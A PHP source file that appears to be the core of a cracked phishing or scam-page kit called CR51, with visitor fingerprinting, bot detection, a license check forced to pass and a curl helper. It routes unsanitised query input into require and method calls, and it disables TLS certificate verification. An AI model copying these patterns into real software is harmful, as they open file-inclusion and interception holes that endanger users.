<?php
error_reporting(0);
defined("ALLOW") or exit('No direct script access allowed');

class goCR51
{
	private $_TOKEN = FCPATH . "CR51/Brain/.settings.ini";
	public function __construct()
	{
		$this->load_agent();

		if (isset($_SERVER['HTTP_USER_AGENT'])) {
			$this->agent = trim($_SERVER['HTTP_USER_AGENT']);
			$this->compile_data();
		}
	}

	public function runApp()
	{
		$uri = trim($_GET['z']);
		$uri = explode("/", $uri);

		if (!isset($_GET['z'])) {
			$controller = "Home";
		} else {
			$controller = ucfirst($uri[0]);
		}

		if (file_exists(FCPATH . "CR51/Controllers/" . $controller . ".php")) {
			require FCPATH . "CR51/Controllers/" . $controller . ".php";
			$controller = new $controller;
		} else {
			_404("Unknown Controller {$controller}");
		}

		if (isset($uri[1]) and (!empty($uri[1]))) {
			$method = trim($uri[1]);
			if (method_exists($controller, $method)) {
				$controller->$method();
			} else {
				_404("Unknown method {$method}");
			}
		} else {
			$controller->index();
		}
	}

	public $agent = NULL;
	public $is_browser = FALSE;
	public $is_robot = FALSE;
	public $is_mobile = FALSE;
	public $languages = [];
	public $platforms = [];
	public $browsers = [];
	public $mobiles = [];
	public $isp = '';
	public $country = '';
	public $countryCode = '';
	public $regionName = '';
	public $ip_address = '';
	public $hostname = '';
	public $platform = '';
	public $browser = '';
	public $version = '';
	public $mobile = '';
	public $robot = '';

	protected function load_agent()
	{
		$this->platforms = ['windows nt 10.0' => 'Windows 10', 'windows nt 6.3' => 'Windows 8.1', 'windows nt 6.2' => 'Windows 8', 'windows nt 6.1' => 'Windows 7', 'windows nt 6.0' => 'Windows Vista', 'windows nt 5.2' => 'Windows 2003', 'windows nt 5.1' => 'Windows XP', 'windows nt 5.0' => 'Windows 2000', 'windows nt 4.0' => 'Windows NT 4.0', 'winnt4.0' => 'Windows NT 4.0', 'winnt 4.0' => 'Windows NT', 'winnt' => 'Windows NT', 'windows 98' => 'Windows 98', 'win98' => 'Windows 98', 'windows 95' => 'Windows 95', 'win95' => 'Windows 95', 'windows phone' => 'Windows Phone', 'windows' => 'Unknown Windows OS', 'android' => 'Android', 'blackberry' => 'BlackBerry', 'iphone' => 'iOS', 'ipad' => 'iOS', 'ipod' => 'iOS', 'os x' => 'Mac OS X', 'ppc mac' => 'Power PC Mac', 'freebsd' => 'FreeBSD', 'ppc' => 'Macintosh', 'linux' => 'Linux', 'debian' => 'Debian', 'sunos' => 'Sun Solaris', 'beos' => 'BeOS', 'apachebench' => 'ApacheBench', 'aix' => 'AIX', 'irix' => 'Irix', 'osf' => 'DEC OSF', 'hp-ux' => 'HP-UX', 'netbsd' => 'NetBSD', 'bsdi' => 'BSDi', 'openbsd' => 'OpenBSD', 'gnu' => 'GNU/Linux', 'unix' => 'Unknown Unix OS', 'symbian' => 'Symbian OS'];
		$this->browsers = ['OPR' => 'Opera', 'Flock' => 'Flock', 'Edge' => 'Edge', 'Chrome' => 'Chrome', 'Opera.*?Version' => 'Opera', 'Opera' => 'Opera', 'MSIE' => 'Internet Explorer', 'Internet Explorer' => 'Internet Explorer', 'Trident.* rv' => 'Internet Explorer', 'Shiira' => 'Shiira', 'Firefox' => 'Firefox', 'Chimera' => 'Chimera', 'Phoenix' => 'Phoenix', 'Firebird' => 'Firebird', 'Camino' => 'Camino', 'Netscape' => 'Netscape', 'OmniWeb' => 'OmniWeb', 'Safari' => 'Safari', 'Mozilla' => 'Mozilla', 'Konqueror' => 'Konqueror', 'icab' => 'iCab', 'Lynx' => 'Lynx', 'Links' => 'Links', 'hotjava' => 'HotJava', 'amaya' => 'Amaya', 'IBrowse' => 'IBrowse', 'Maxthon' => 'Maxthon', 'Ubuntu' => 'Ubuntu Web Browser'];
		$this->mobiles = ['mobileexplorer' => 'Mobile Explorer', 'palmsource' => 'Palm', 'palmscape' => 'Palmscape', 'motorola' => 'Motorola', 'nokia' => 'Nokia', 'nexus' => 'Nexus', 'palm' => 'Palm', 'iphone' => 'Apple iPhone', 'ipad' => 'iPad', 'ipod' => 'Apple iPod Touch', 'sony' => 'Sony Ericsson', 'ericsson' => 'Sony Ericsson', 'blackberry' => 'BlackBerry', 'cocoon' => 'O2 Cocoon', 'blazer' => 'Treo', 'lg' => 'LG', 'amoi' => 'Amoi', 'xda' => 'XDA', 'mda' => 'MDA', 'vario' => 'Vario', 'htc' => 'HTC', 'samsung' => 'Samsung', 'sharp' => 'Sharp', 'sie-' => 'Siemens', 'alcatel' => 'Alcatel', 'benq' => 'BenQ', 'ipaq' => 'HP iPaq', 'mot-' => 'Motorola', 'playstation portable' => 'PlayStation Portable', 'playstation 3' => 'PlayStation 3', 'playstation vita' => 'PlayStation Vita', 'hiptop' => 'Danger Hiptop', 'nec-' => 'NEC', 'panasonic' => 'Panasonic', 'philips' => 'Philips', 'sagem' => 'Sagem', 'sanyo' => 'Sanyo', 'spv' => 'SPV', 'zte' => 'ZTE', 'sendo' => 'Sendo', 'nintendo dsi' => 'Nintendo DSi', 'nintendo ds' => 'Nintendo DS', 'nintendo 3ds' => 'Nintendo 3DS', 'wii' => 'Nintendo Wii', 'open web' => 'Open Web', 'openweb' => 'OpenWeb', 'meizu' => 'Meizu', 'android' => 'Android', 'symbian' => 'Symbian', 'SymbianOS' => 'SymbianOS', 'elaine' => 'Palm', 'series60' => 'Symbian S60', 'windows ce' => 'Windows CE', 'obigo' => 'Obigo', 'netfront' => 'Netfront Browser', 'openwave' => 'Openwave Browser', 'mobilexplorer' => 'Mobile Explorer', 'operamini' => 'Opera Mini', 'opera mini' => 'Opera Mini', 'opera mobi' => 'Opera Mobile', 'fennec' => 'Firefox Mobile', 'digital paths' => 'Digital Paths', 'avantgo' => 'AvantGo', 'xiino' => 'Xiino', 'novarra' => 'Novarra Transcoder', 'vodafone' => 'Vodafone', 'docomo' => 'NTT DoCoMo', 'o2' => 'O2', 'mobile' => 'Generic Mobile', 'wireless' => 'Generic Mobile', 'j2me' => 'Generic Mobile', 'midp' => 'Generic Mobile', 'cldc' => 'Generic Mobile', 'up.link' => 'Generic Mobile', 'up.browser' => 'Generic Mobile', 'smartphone' => 'Generic Mobile', 'cellphone' => 'Generic Mobile'];
		$this->robots = ['googlebot' => 'Googlebot', 'msnbot' => 'MSNBot', 'baiduspider' => 'Baiduspider', 'bingbot' => 'Bing', 'slurp' => 'Inktomi Slurp', 'yahoo' => 'Yahoo', 'ask jeeves' => 'Ask Jeeves', 'fastcrawler' => 'FastCrawler', 'infoseek' => 'InfoSeek Robot 1.0', 'lycos' => 'Lycos', 'yandex' => 'YandexBot', 'mediapartners-google' => 'MediaPartners Google', 'CRAZYWEBCRAWLER' => 'Crazy Webcrawler', 'adsbot-google' => 'AdsBot Google', 'feedfetcher-google' => 'Feedfetcher Google', 'curious george' => 'Curious George', 'ia_archiver' => 'Alexa Crawler', 'MJ12bot' => 'Majestic-12', 'Uptimebot' => 'Uptimebot'];
	}

	protected function compile_data()
	{
		$this->set_platform();
		$this->set_ip_address();
		$this->set_hostname();

		foreach (array(
			'set_robot',
			'set_browser',
			'set_mobile'
		) as $function) {
			if ($this->$function() === TRUE) {
				break;
			}
		}
	}

	protected function set_platform()
	{
		if (is_array($this->platforms) && count($this->platforms) > 0) {

			foreach ($this->platforms as $key => $val) {

				if (preg_match('|' . preg_quote($key) . '|i', $this->agent)) {
					$this->platform = $val;
					return TRUE;
				}
			}
		}

		$this->platform = 'Unknown Platform';
		return FALSE;
	}

	protected function set_browser()
	{
		if (is_array($this->browsers) && count($this->browsers) > 0) {

			foreach ($this->browsers as $key => $val) {

				if (preg_match('|' . $key . '.*?([0-9\.]+)|i', $this->agent, $match)) {
					$this->is_browser = TRUE;
					$this->version    = $match[1];
					$this->browser    = $val;
					$this->set_mobile();
					return TRUE;
				}
			}
		}

		return FALSE;
	}

	protected function set_robot()
	{
		if (is_array($this->robots) && count($this->robots) > 0) {

			foreach ($this->robots as $key => $val) {

				if (preg_match('|' . preg_quote($key) . '|i', $this->agent)) {
					$this->is_robot = TRUE;
					$this->robot    = $val;
					$this->set_mobile();
					return TRUE;
				}
			}
		}

		return FALSE;
	}

	protected function set_mobile()
	{
		if (is_array($this->mobiles) && count($this->mobiles) > 0) {

			foreach ($this->mobiles as $key => $val) {

				if (FALSE !== (stripos($this->agent, $key))) {
					$this->is_mobile = TRUE;
					$this->mobile    = $val;
					return TRUE;
				}
			}
		}
		return FALSE;
	}

	public function is_browser($key = NULL)
	{
		if (!$this->is_browser) {
			return FALSE;
		}

		if ($key === NULL) {
			return TRUE;
		}

		return (isset($this->browsers[$key]) && $this->browser === $this->browsers[$key]);
	}

	public function is_robot($key = NULL)
	{
		if (!$this->is_robot) {
			return FALSE;
		}

		if ($key === NULL) {
			return TRUE;
		}

		return (isset($this->robots[$key]) && $this->robot === $this->robots[$key]);
	}

	public function is_mobile($key = NULL)
	{
		if (!$this->is_mobile) {
			return FALSE;
		}

		if ($key === NULL) {
			return TRUE;
		}

		return (isset($this->mobiles[$key]) && $this->mobile === $this->mobiles[$key]);
	}

	public function agent_string()
	{
		return $this->agent;
	}

	public function platform()
	{
		return $this->platform;
	}

	public function browser()
	{
		return $this->browser;
	}

	public function version()
	{
		return $this->version;
	}

	public function robot()
	{
		return $this->robot;
	}

	public function mobile()
	{
		return $this->mobile;
	}

	public function referrer()
	{
		return empty($_SERVER['HTTP_REFERER']) ? '' : trim($_SERVER['HTTP_REFERER']);
	}

	public function languages()
	{
		if (count($this->languages) === 0) {
			$this->set_languages();
		}

		return $this->languages;
	}

	protected function set_languages()
	{
		if ((count($this->languages) === 0) && !empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
			$this->languages = explode(',', preg_replace('/(;\s?q=[0-9\.]+)|\s/i', '', strtolower(trim($_SERVER['HTTP_ACCEPT_LANGUAGE']))));
		}

		if (count($this->languages) === 0) {
			$this->languages = array(
				'Undefined'
			);
		}
	}

	public function set_ip_address()
	{
		foreach (['CLIENT_IP', 'FORWARDED', 'FORWARDED_FOR', 'FORWARDED_FOR_IP', 'HTTP_X_CLIENT_IP', 'VIA', 'X_FORWARDED', 'X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'HTTP_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED_FOR_IP', 'HTTP_PROXY_CONNECTION', 'HTTP_VIA', 'HTTP_X_FORWARDED', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_CLUSTER_CLIENT_IP', 'REMOTE_ADDR'] as $key) {
			if (array_key_exists($key, $_SERVER) === TRUE) {
				foreach (explode(',', $_SERVER[$key]) as $ip) {
					$ip = trim($ip);
					if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== FALSE) {
						$this->ip_address = $ip;
					} else {
						$this->ip_address = '114.124.205.120';
					}
					return TRUE;
				}
			}
		}

		$this->ip_address = 'Unknown IP Address';
		return FALSE;
	}

	public function set_hostname()
	{
		if ($this->ip_address === '114.124.205.120') {
			$this->hostname = "localhost";
		} elseif ($this->ip_address === 'Unknown IP Address') {
			$this->hostname = "security-up";
		} else {
			$this->hostname = gethostbyaddr($this->ip_address);
		}

		return TRUE;
	}
}

class license
{
	public function a16_blocker($ip)
	{
		return false;
	}
	public function validate()
	{
		if (1 === 1) {
			$data = array(
				'status' => true,
				'message' => 'CR51 Was READYY'
			);
		} else {
			$data = array(
				'status' => false,
				'message' => 'CR51 Was Here!'
			);
		}
		return $data;
	}
	public function formJson($url, $postdata)
	{
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			'Content-Type:application/json'
		));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_0);
		$result = curl_exec($ch);
		curl_close($ch);
		return json_decode($result, 1);
	}
}
